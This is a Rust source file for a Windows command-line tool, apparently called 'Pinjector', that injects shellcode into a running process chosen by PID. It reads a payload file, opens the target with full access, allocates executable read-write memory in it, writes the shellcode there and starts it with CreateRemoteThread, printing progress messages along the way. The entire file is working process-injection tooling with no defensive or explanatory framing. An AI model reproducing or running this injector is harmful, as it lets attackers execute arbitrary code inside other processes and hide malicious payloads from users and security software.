extern crate winapi;
use std::{env, process::exit, ptr::null_mut as NULL, fs::File, io::Read, path::Path};
use winapi::{
    ctypes::c_void,
    shared::{basetsd::SIZE_T, minwindef::DWORD},
    um::{
        synchapi::WaitForSingleObject,
        errhandlingapi::GetLastError,
        handleapi::CloseHandle,
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{CreateRemoteThread, OpenProcess},
        winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS},
        winbase::INFINITE,
    },
};

macro_rules! okay{($($arg:tt)*) => {println!("[+] {}", format_args!($($arg)*))};}
macro_rules! info{($($arg:tt)*) => {println!("[!] {}", format_args!($($arg)*))};}
macro_rules! warn{($($arg:tt)*) => {println!("[-] {}", format_args!($($arg)*))};}

fn rpayload(path: &str) -> Result<Vec<u8>, String> {
    let mut file = File::open(path).map_err(|e| format!("Failed to open file: {}", e))?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).map_err(|e| format!("Failed to read file: {}", e))?;
    Ok(buffer)
}

fn injection(pid: u32, payload: &[u8]) -> Result<(), String> {
    let mut tid: DWORD = 0;

    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            warn!("Failed to open process, error: {}", GetLastError());
            exit(1)
        }
        okay!("Process opened successfully");

        let buffer = VirtualAllocEx(
            process,
            NULL(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if buffer.is_null() {
            CloseHandle(process);
            warn!("Failed to allocate memory, error: {}", GetLastError());
            exit(1)
        }
        okay!("Allocated memory with RWX, address: {:p}, size: {}", buffer, payload.len());

        let mut written: SIZE_T = 0;
        let write = WriteProcessMemory(
            process,
            buffer,
            payload.as_ptr() as *const c_void,
            payload.len(),
            &mut written as *mut SIZE_T,
        );
        if write == 0 {
            CloseHandle(process);
            warn!("Failed to write memory, error: {}", GetLastError());
            exit(1)
        }
        okay!("Successfully wrote shellcode to memory");

        let thread = CreateRemoteThread(
            process,
            NULL(),
            0,
            Some(std::mem::transmute::<*mut c_void, unsafe extern "system" fn(*mut c_void) -> u32>(buffer)),
            NULL(),
            0,
            &mut tid,
        );
        if thread.is_null() {
            warn!("Failed to get a handle to the new thread, error: {}", GetLastError());
            exit(1)
        }

        okay!("Successfully got handle to TID: ({}) - {:?}", tid, process);
        info!("Waiting for thread to execute");
        WaitForSingleObject(thread, INFINITE);
        info!("Thread finished executing, cleaning up");

        CloseHandle(process);
        CloseHandle(thread);
    }

    Ok(())
}

fn banner() {
    let banner = r#"
    ____  _         _           __            
   / __ \(_)___    (_)__  _____/ /_____  _____
  / /_/ / / __ \  / / _ \/ ___/ __/ __ \/ ___/
 / ____/ / / / / / /  __/ /__/ /_/ /_/ / /    
/_/   /_/_/ /_/_/ /\___/\___/\__/\____/_/     
             /___/     @0xans                       
    "#;
    println!("{}", banner)
}

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() != 5 {
        warn!("Error: Invalid number of arguments.");
        info!("Usage: {} -p <pid> -s <shellcode_file>", Path::new(&args[0]).file_name().unwrap().to_str().unwrap());
        exit(1);
    }

    let mut pid: Option<u32> = None;
    let mut shellfile: Option<String> = None;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-p" => {
                pid = Some(args[i + 1].parse::<u32>().unwrap_or_else(|_| {
                    warn!("Error: PID must be a valid integer.");
                    exit(1);
                }));
                i += 2;
            },
            "-s" => {
                shellfile = Some(args[i + 1].clone());
                i += 2;
            },
            _ => {
                warn!("Error: Unrecognized argument.");
                exit(1);
            }
        }
    }

    if pid.is_none() || shellfile.is_none() {
        warn!("Error: Both -p (PID) and -s (shellcode file) arguments are required.");
        exit(1);
    }

    let pid = pid.unwrap();
    let shellfile = shellfile.unwrap();

    banner();

    let payload = rpayload(&shellfile).unwrap_or_else(|err| {
        warn!("Error: {}", err);
        exit(1);
    });

    match injection(pid, &payload) {
        Ok(_) => okay!("Injection successful!"),
        Err(e) => warn!("Error during injection: {}", e),
    }
}
